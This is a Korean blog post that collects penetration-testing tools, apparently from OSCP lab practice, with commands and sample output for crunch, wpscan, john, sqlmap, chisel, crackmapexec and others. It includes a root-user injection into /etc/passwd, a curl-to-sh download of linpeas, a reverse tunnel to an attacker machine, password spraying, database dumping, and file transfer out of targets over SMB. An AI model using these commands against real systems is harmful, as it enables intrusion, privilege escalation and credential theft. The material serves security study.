---
layout: post
title: 유용한 리눅스 툴 모음집
subtitle: 많이 쓰는 리눅스 툴 모음집
category: knowledge
thumbnail-img: /assets/img/hazard.jpg
tags: [linux, tool]
author: Hong
---

너무 자주 써서 이미 외워버린 툴들은 생략한다.

# crunch

브루트포스에 사용 할 단어 조합을 직접 만드는 툴.

`crunch 6 6 -t Lab%%% > wordlist`

최소 글자 수와 최대 글자 수를 모두 6으로 설정하고 -t 옵션으로 만들고 싶은 문자의 패턴을 지정한다.

```bash
kali@kali:~$ cat wordlist
Lab000
Lab001
Lab002
Lab003
Lab004
Lab005
Lab006
Lab007
Lab008
Lab009
...
```

# tcpdump

네트워크 패킷을 볼 수 있다.

하지만 관리자 권한으로만 실행 할 수 있다.

-i에 lo (loopback)을 설정하고 -A 옵션으로 ASCII형식으로 출력 할 수 있다.

```bash
joe@debian-privesc:~$ sudo tcpdump -i lo -A | grep "pass"
[sudo] password for joe:
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
...{...zuser:root,pass:lab -
...5...5user:root,pass:lab -
```

# openssl

/etc/passwd 파일에 암호 해쉬를 추가하고 싶을 때 해쉬화 할 수 있다.

```bash
joe@debian-privesc:~$ openssl passwd w00t
Fdzt.eqJQ4s0g

joe@debian-privesc:~$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd

joe@debian-privesc:~$ su root2
Password: w00t

root@debian-privesc:/home/joe# id
uid=0(root) gid=0(root) groups=0(root)
```

# linpeas

linux에 처음 침입했을 때 자동으로 취약점을 검색해주는 툴

```
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

[linpeas](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)깃허브 페이지.

# mousepad, leafpad

메모장 같은 텍스트 편집 툴.

GUI라서 다루기 쉽고 익숙하다.

# Tempail

일회용 이메일을 만들고 사용할 때 유용한 서비스

[웹페이지](https://tempail.com/)

# evil-winrm

너무 자주 쓰는 윈도우 접속 툴.

접속하려는 유저가 windows remote management 그룹에 속해있어야 한다.

```
┌──(kali㉿kali)-[~/offsec]
└─$  evil-winrm -i 192.168.125.220 -u hong -p "hong"

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\hong\Documents> cd /
*Evil-WinRM* PS C:\> ls
```

# whatweb

웹사이트의 구성, 버전 정보들을 알 수 있다.

```
whatweb http://192.168.50.244

http://192.168.50.244 [301 Moved Permanently] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.50.244], RedirectLocation[http://192.168.50.244/main/], UncommonHeaders[x-redirect-by]
http://192.168.50.244/main/ [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.50.244], JQuery[3.6.0], MetaGenerator[WordPress 6.0.2], Script, Title[BEYOND Finances &#8211; We provide financial freedom], UncommonHeaders[link], WordPress[6.0.2]
```

# wpscan

워드프레스 전용 취약점 분석 툴.

타겟 웹서버가 워드프레스를 사용 중이라면 필수로 돌려본다.

```
kali@kali:~/beyond$ wpscan --url http://192.168.50.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan

kali@kali:~/beyond$ cat websrv1/wpscan
...

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://192.168.50.244/wp-content/plugins/akismet/
 | Latest Version: 5.0
 | Last Updated: 2022-07-26T16:13:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.50.244/wp-content/plugins/akismet/, status: 500
 |
 | The version could not be determined.

[+] classic-editor
 | Location: http://192.168.50.244/wp-content/plugins/classic-editor/
 | Latest Version: 1.6.2
 | Last Updated: 2021-07-21T22:08:00.000Z
...

[+] contact-form-7
 | Location: http://192.168.50.244/wp-content/plugins/contact-form-7/
 | Latest Version: 5.6.3 (up to date)
 | Last Updated: 2022-09-01T08:48:00.000Z
...

[+] duplicator
 | Location: http://192.168.50.244/wp-content/plugins/duplicator/
 | Last Updated: 2022-09-24T17:57:00.000Z
 | Readme: http://192.168.50.244/wp-content/plugins/duplicator/readme.txt
 | [!] The version is out of date, the latest version is 1.5.1
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.50.244/wp-content/plugins/duplicator/, status: 403
 |
 | Version: 1.3.26 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.50.244/wp-content/plugins/duplicator/readme.txt

[+] elementor
 | Location: http://192.168.50.244/wp-content/plugins/elementor/
 | Latest Version: 3.7.7 (up to date)
 | Last Updated: 2022-09-20T14:51:00.000Z
...

[+] wordpress-seo
 | Location: http://192.168.50.244/wp-content/plugins/wordpress-seo/
 | Latest Version: 19.7.1 (up to date)
 | Last Updated: 2022-09-20T14:10:00.000Z
...
```

# John

해쉬,비밀번호를 크랙킹하는데 필수 적인 툴

John안에는 다양한 버전들이 있다.

## ssh2john

ssh의 키에 비밀번호가 걸려있을 때 사용.

```
kali@kali:~/beyond/websrv1$ ssh -i id_rsa daniela@192.168.50.244
Enter passphrase for key 'id_rsa': #<-- 이렇게 비밀번호를 물어볼 떄

kali@kali:~/beyond/websrv1$ ssh2john id_rsa > ssh.hash

kali@kali:~/beyond/websrv1$ john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
...
tequieromucho    (id_rsa)    <<- ssh의 암호와는 다름. 개인키의 암호.
...
```

## 7z2john

7z 파일에 비밀번호가 걸려있을 때

## keepass2john

keepass데이터베이스 파일에 비밀번호가 걸려있을 때

# sqlmap

sql인젝션 공격할 때 블라인드 sql이라 시간이 오래걸리고 효율이 많이 떨어질 때 사용.

`sudo proxychains sqlmap --dump -u http://192.168.51.12/index.php --data="user=1&pass=1" --dbms="MySQL" --output-dir="/home/kali/sentaku"`

기본적으로 oscp에서는 사용 금지.

```
Database: mihari_db
Table: users
[2 entries]
+----+--------------+----------+
| id | password     | username |
+----+--------------+----------+
| 1  | madscientist | okabe    |
| 2  | SuperHacker  | daru     |
+----+--------------+----------+
```

# chisel

http 프로토콜을 사용하여 프록시를 연결한다.

서버와 클라이언트의 버전이 같아야 한다.

## 서버 (공격자)

```
sudo ./chisel_1.10.1_linux_amd64 server --reverse --port 7777
```

## 클라이언트 (타겟)

```
.\chisel.exe client -v 10.8.0.101:7777 R:socks

2025/02/05 12:06:21 client: Connecting to ws://10.8.0.101:7777
2025/02/05 12:06:21 client: Handshaking...
2025/02/05 12:06:21 client: Sending config
2025/02/05 12:06:21 client: Connected (Latency 27.6269ms)
2025/02/05 12:06:21 client: tun: SSH connected
```

# crackmapexec

크레덴셜 스프레이 공격에 매우 유용하다.

```
crackmapexec smb 172.16.157.0/24
SMB         172.16.157.13   445    PROD01           [*] Windows 10.0 Build 20348 x64 (name:PROD01) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         172.16.157.12   445    DEV04            [*] Windows 10.0 Build 20348 x64 (name:DEV04) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         172.16.157.11   445    FILES02          [*] Windows 10.0 Build 20348 x64 (name:FILES02) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         172.16.157.10   445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:medtech.com) (signing:True) (SMBv1:False)
SMB         172.16.157.82   445    CLIENT01         [*] Windows 10.0 Build 22000 x64 (name:CLIENT01) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         172.16.157.83   445    CLIENT02         [*] Windows 10.0 Build 22000 x64 (name:CLIENT02) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         172.16.157.254  445    WEB02            [*] Windows 10.0 Build 20348 x64 (name:WEB02) (domain:medtech.com) (signing:False) (SMBv1:False)
```

# nxc

crackmapexec과 비슷한 용도로 사용된다.

spraying 툴로써 좋다. winrm, ssh, smb… 여러 서비스에 사용 가능하다.

```
 nxc winrm 172.16.194.10 -u users.txt -p passwords.txt
WINRM       172.16.194.10   5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:medtech.com)
WINRM       172.16.194.10   5985   DC01             [-] medtech.com\leon:Flowers1
WINRM       172.16.194.10   5985   DC01             [-] medtech.com\offsec:Flowers1
WINRM       172.16.194.10   5985   DC01             [-] medtech.com\wario:Flowers1
WINRM       172.16.194.10   5985   DC01             [-] medtech.com\daisy:Flowers1
WINRM       172.16.194.10   5985   DC01             [-] medtech.com\toad:Flowers1
WINRM       172.16.194.10   5985   DC01             [-] medtech.com\goomba:Flowers1
WINRM       172.16.194.10   5985   DC01             [-] medtech.com\joe:Flowers1
WINRM       172.16.194.10   5985   DC01             [-] medtech.com\yoshi:Flowers1
```

# impacket-smbserver

개인적으로 가장 감탄했던 툴.

타겟머신에서 공격자 머신으로 파일들을 전송할 때 유용하다.

## smb 서버

relia는 공유폴더에 사용 할 이름.

뒤에 오는 .은 현재 디렉토리를 설정.

```
 impacket-smbserver relia . -smb2support -username test -password test
```

## smb 클라이언트

아래와 같이 서버의 주소와 디렉토리, 유저명과 비밀번호로 접속한다.

사용하는 드라이브는 아무거나 상관없다. Z: e: p: q:...

```
net use Z: \\192.168.45.155\relia test /user:test
The command completed successfully.

PS C:\> ls \\192.168.45.155\relia
ls \\192.168.45.155\relia


    Directory: \\192.168.45.155\relia


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         2/20/2025   6:56 PM           2052 automatic_configuration.lnk
-a----         2/20/2025   6:58 PM            721 config.Library-ms
-a----         2/20/2025   9:10 PM            286 hash.txt
```

# pspy

감탄했던 또 다른 툴.

루트 권한이 없이도 프로세스를 보는게 가능하다. 명령어들도 같이 보여서 매우 유용하다.

```
2025/02/22 23:42:02 CMD: UID=0     PID=36509  | /usr/bin/python3 /usr/bin/borg delete /opt/borgbackup::usb_1740267242
2025/02/22 23:42:02 CMD: UID=0     PID=36510  | /usr/bin/python3 /usr/bin/borg delete /opt/borgbackup::usb_1740267242
2025/02/22 23:42:03 CMD: UID=0     PID=36511  | /bin/bash /root/createbackup.sh
2025/02/22 23:42:03 CMD: UID=0     PID=36512  | /bin/bash /root/createbackup.sh
2025/02/22 23:42:03 CMD: UID=0     PID=36513  | /bin/sh -c BORG_PASSPHRASE='xinyVzoH2AnJpRK9sfMgBA' borg create /opt/borgbackup::usb_1740267723 /media/usb0
2025/02/22 23:42:03 CMD: UID=0     PID=36514  | /usr/bin/python3 /usr/bin/borg create /opt/borgbackup::usb_1740267723 /media/usb0
2025/02/22 23:42:03 CMD: UID=0     PID=36515  | /usr/bin/python3 /usr/bin/borg create /opt/borgbackup::usb_1740267723 /media/usb0
2025/02/22 23:42:03 CMD: UID=0     PID=36516  | /bin/bash /root/createbackup.sh
2025/02/22 23:42:18 CMD: UID=0     PID=36525  | /usr/bin/python3 /usr/bin/borg create /opt/borgbackup::usb_1740267738 /media/usb0
2025/02/22 23:42:18 CMD: UID=0     PID=36524  | /bin/sh -c BORG_PASSPHRASE='xinyVzoH2AnJpRK9sfMgBA' borg create /opt/borgbackup::usb_1740267738 /media/usb0
2025/02/22 23:42:18 CMD: UID=0     PID=36526  | /usr/bin/python3 /usr/bin/borg create /opt/borgbackup::usb_1740267738 /media/usb0
2025/02/22 23:42:18 CMD: UID=0     PID=36527  | /usr/bin/python3 /usr/bin/borg create /opt/borgbackup::usb_1740267738 /media/usb0
2025/02/22 23:42:18 CMD: UID=0     PID=36528  | /bin/bash /root/createbackup.sh
2025/02/22 23:42:33 CMD: UID=0     PID=36537  | /usr/bin/python3 /usr/bin/borg create /opt/borgbackup::usb_1740267753 /media/usb0
2025/02/22 23:42:33 CMD: UID=0     PID=36536  | /bin/sh -c BORG_PASSPHRASE='xinyVzoH2AnJpRK9sfMgBA' borg create /opt/borgbackup::usb_1740267753 /media/usb0
2025/02/22 23:42:34 CMD: UID=0     PID=36538  | /usr/bin/python3 /usr/bin/borg create /opt/borgbackup::usb_1740267753 /media/usb0
2025/02/22 23:42:34 CMD: UID=0     PID=36539  | /usr/bin/python3 /usr/bin/borg create /opt/borgbackup::usb_1740267753 /media/usb0
2025/02/22 23:42:34 CMD: UID=0     PID=36540  | /bin/bash /root/createbackup.sh
```

# evince

pdf 파일을 리눅스에서도 볼 수 있다.

# snmpbulkwalk

snmp 서비스를 enum할 때 사용한다.
그냥 snmp-walk보다 더 많은 정보가 나온다.
`snmpbulkwalk -c public -v2c 192.168.131.149 .`

# git-dumper

웹사이트 조사 중 .git이 있을 때 덤프 하는 툴.

[git-dumper](https://github.com/arthaud/git-dumper)

wget -r 옵션으로도 가능하지만 깃의 용량이 클 경우 매우 긴 시간이 걸리기 때문에 이 툴을 사용하면 금방 덤프할 수 있다.

# powerview

[powerview](https://github.com/aniqfakhrul/powerview.py)

파이썬 스크립트로 작성된 툴. 번거롭게 윈도우로 파워뷰를 전송하지 않아도 유저의 크레덴셜을 알면 리눅스에서 실행 할 수 있다.

명령어도 더 쓰기 쉽고 tab 호환도 되서 입력도 빠르다. 그리고 결과가 나오는 속도도 빨라서 좋다.
